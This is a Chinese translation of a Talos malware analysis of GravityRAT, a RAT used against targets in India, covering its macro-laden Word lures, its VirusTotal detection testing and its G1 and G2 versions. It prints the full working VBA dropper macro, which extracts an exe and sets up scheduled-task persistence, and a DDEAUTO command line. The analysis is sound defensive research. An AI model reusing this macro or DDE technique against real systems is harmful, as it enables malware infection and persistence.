# GravityRAT：以印度为APT目标两年内的演变史
|
##### 译文声明
本文是翻译文章，文章来源：blog.talosintelligence.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 一、前言
今天思科的Talos团队发现了一款新型恶意软件，在过去的两年内，该恶意软件一直隐藏在人们的眼皮底下，并且仍在持续发展中。几个星期以前，我们发现攻击者开始使用这款RAT（远程访问工具）的最新变种，我们将这款恶意软件称之为GravityRAT。在本文中，我们将讨论GravityRAT的技术功能、演进及发展历史，同时追踪溯源隐藏在背后的潜在攻击者。
GravityRAT的持续发展时间至少已长达18个月之久，在此期间开发者已经实现了一些新的功能。在GravityRAT的发展过程中，我们可以看到研发者添加了文件提取、远程命令执行、反虚拟环境技术。除了标准的远程命令执行以外，这条演变路线也表明背后的攻击者具备坚定的决心及创造力。
在调查过程中，我们观察到攻击者使用了多个恶意文档来攻击受害者。开发者之前曾利用这些恶意文档在VirusTotal这个分析平台上进行测试。利用VirusTotal，开发者可以不断改进恶意软件，降低被反病毒软件检测到的概率。
虽然GravityRAT之前没被公开讨论过，但印度的国家计算机应急响应小组（CERT）曾公布过一些信息，表示攻击者曾使用GravityRAT发起针对印度的[攻击活动](https://nic-cert.nic.in/NIC_CERT/pdf/13-Advisory%20for%20Malicious%20Targeted%20Attack%20Campaign.pdf)。最后，由于我们识别出了一些信息（比如位置信息以及开发者的名称），我们将讨论研究过程中发现的一些追踪溯源信息，我们认为这是开发者自己不小心导致这些信息泄露出来。
## 二、感染途径
###  恶意Office文档
恶意软件开发者构造的恶意文档大多为Microsoft Office
Word文档。攻击者使用嵌入式宏在受害者系统上执行命令。当受害者打开恶意文档后，将看到如下界面：
恶意文档会让用户证明自己不是机器人（类似我们在网上经常看到的CAPTCHA（验证码）识别操作），诱骗用户启用宏功能。这是许多基于Office的恶意软件的惯用伎俩。攻击者尝试通过这种方法，欺骗启用了受保护模式（Protected
Mode）的那些用户。启用宏之后，恶意软件就可以开始执行。我们发现文档所释放出来的嵌入式宏其实非常小。
    Sub AutoOpen()
      If Not Dir(Environ("TEMP") + "image4.exe") <> "" Then
        Const lCancelled_c As Long = 0
          Dim sSaveAsPath As String
          sSaveAsPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") + "temporary.zip"
          If VBA.LenB(sSaveAsPath) = lCancelled_c Then Exit Sub
          ActiveDocument.Save
          Application.Documents.Add ActiveDocument.FullName
          ActiveDocument.SaveAs sSaveAsPath
          ActiveDocument.Close
          Set app = CreateObject("Shell.Application")
          ExtractTo = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%")
          ExtractByExtension app.NameSpace(Environ("TEMP") + "temporary.zip"), "exe", ExtractTo
      End If
    End Sub
    Sub ExtractByExtension(fldr, ext, dst)
      Set FSO = CreateObject("Scripting.FileSystemObject")
      Set app = CreateObject("Shell.Application")
      For Each f In fldr.Items
        If f.Type = "File folder" Then
          ExtractByExtension f.GetFolder, ext, dst
        ElseIf LCase(FSO.GetExtensionName(f.Name)) = LCase(ext) Then
          If Not Dir(Environ("TEMP") + "image4.exe") <> "" Then
            app.NameSpace(dst).CopyHere f.Path, &H4
          End If
        End If
      Next
      Shell "schtasks /create /tn wordtest /tr ""'%temp%image4.exe' 35"" /sc DAILY /f /RI 10 /du 24:00 /st 00:01"
    End Sub
这个宏包含3个函数：
1、当文档打开时会执行第1个函数。该函数的功能是将当前活动的文档（即已打开的Word文档）拷贝到临时目录中，然后将其重命名为ZIP压缩文档。docx格式实际上就是常见的ZIP压缩格式，可以使用常用工具进行解压。
2、第2个函数可以解压`temporary.zip`文件，提取其中存储的`.exe`文件。
3、第3个函数创建名为“wordtest”的计划任务，每天执行这个恶意文件。
利用这种方法，攻击者可以确保不存在直接执行（执行恶意文件的任务交给计划任务来处理）、没有下载额外载荷，并且攻击者利用docx格式为压缩格式这一点，将可执行文件（即GravityRAT）成功包装起来。
###  文档测试操作
在跟踪过程中，我们发现攻击者出于测试目的，往VirusTotal上提交了多个恶意文档。攻击者测试了恶意宏的检测率（宏经过修改，或者将执行恶意载荷替换成运行calc），开发者尝试了利用Office文档的DDE（dynamic
data exchange）来执行命令。这是对Microsoft
Office文档中存在的DDE协议的一种滥用方法，虽然微软提供了这一功能，但攻击者也可以利用这个功能从事恶意活动。微软前一段时间已经公布了相应的[缓解措施](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440)。开发者构造了Office
Word以及Excel文档，以探测这些文档在VirusTotal上的检测率。攻击者尝试将DDE对象隐藏在文档的不同部位：比如在主对象或者在头部中。在提交检测的样本中，DDE对象只是简单地运行微软的计算器程序。样本如下所示：
     DDEAUTO c:\windows\system32\cmd.exe "/k calc.exe" 
根据文件名，我们认为已提交的这些样本应当都是测试文档，攻击者使用不同的方法和Office技巧以确保恶意软件不被检测出来。这些文件名如下所示：
    testnew1.docx
    Test123.docx
    test456.docx
    test2.docx
    book1test2.xlsx
    Test123.doc
## 三、GRAVITYRAT
最开始我们通过一个恶意Word文档发现了GravityRAT的踪影。前面提到过，这个Word文档包含各种宏用来传递最终载荷。考虑到这是恶意软件的最新版本，因此我们想进一步确定这个攻击者的活跃时长以及攻击活动的演变历史。我们发现GravityRAT在两年时间内衍生出了4个不同的版本。接下来，我们将详细分析这个开发者的研发生命周期以及恶意功能的添加过程。
###  G1版本
恶意软件开发者以`G`字母为开头来控制软件版本。我们识别出的最早的一个版本为G1版本。该样本的PDB路径如下所示：
    f:FWindows WorkG1Adeel's LaptopG1 Main VirussystemInterruptsgravityobjx86DebugsystemInterrupts.pdb
你会发现上面有个名字：Adeel，这可能是开发者的名字。当然，这个信息可能被恶意软件作者篡改过。这个样本的编译时间为2016年12月，原始的文件名为`resume.exe`。
该版本的目的是窃取受影响系统上的信息，包含如下信息：
    MAC地址
    计算机名
    用户名
    IP地址
    日期
    窃取以.docx、.doc、.pptx、.ppt、.xlsx、 .xls、.rtf以及.pdf为后缀名的文件
    映射到系统上的磁盘卷信息
这些信息随后会发往如下某个域名：
G1还可以根据攻击者的需要，在被感染的主机上执行命令。
###  G2版本
2017年7月份，我们识别出了一款新的变种，名为G2。该样本的PDB路径如下：
    e:Windows WorkG2G2 Main VirusMicrosoft Virus Solutions (G2 v5) (Current)Microsoft Virus SolutionsobjDebugWindows Wireless 802.11.pdb
对于这个版本，开发者修改了恶意软件的架构。主代码的目的是加载并执行两个.NET程序，这两个程序存储在文件的资源区中：
1、第1个资源是[Github](https://github.com/dahall/TaskScheduler)上的一个合法的开源库，该库是Windows
Task Scheduler的.NET封装包。
2、第2个资源就是G2版本的GravityRAT。
该变种所使用的命令控制（C2）服务器与G1一样，然而，我们发现G2中添加了一个额外的“载荷”变量。
该变种与之前的样本功能基本一致，但多了一个功能：该变种可以通过WMI请求收集`Win32_Processor`中的CPU信息（处理器ID、名称、制造商以及时钟速度）。攻击者很有可能会利用该信息在这款恶意软件中规避虚拟机环境。利用该信息，恶意软件可以尝试阻止虚拟环境对自身的分析。
该变种与之前一个变种略微有所区别，可以通过Windows计划任务执行新的载荷。这就解释了为什么恶意软件需要使用一个.NET封装器。